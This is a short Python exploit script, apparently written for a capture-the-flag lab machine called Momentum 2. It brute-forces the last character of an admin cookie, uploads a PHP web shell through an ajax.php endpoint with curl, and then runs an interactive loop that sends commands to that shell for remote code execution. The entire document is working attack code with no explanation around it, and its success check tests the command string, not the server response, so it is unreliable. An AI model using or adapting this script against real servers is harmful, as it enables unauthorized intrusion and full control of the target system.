import os
import requests

alphabet = input("Enter the letter: ")

command = (
	f" curl -k -F 'file=@./shell.php' "
	f"-F 'secure=val1d' --cookie 'admin=&G6u@B6uDXMq&Ms{alphabet}' "
	"http://192.168.43.153/ajax.php")
os.system(command)
print(command)
if "1" in command:
	print("[+] Shell has been uploaded!")
	while True:
		execute_shell_command = input("navi@momentum2:~> ")
		get_rce = requests.get(
			f"http://192.168.43.153/owls/shell.php?cmd={execute_shell_command}"
		)
		print(str(get_rce.content))
		if execute_shell_command == 'clear':
			os.system("clear")
elif "0" in command:
	print("Failed!")
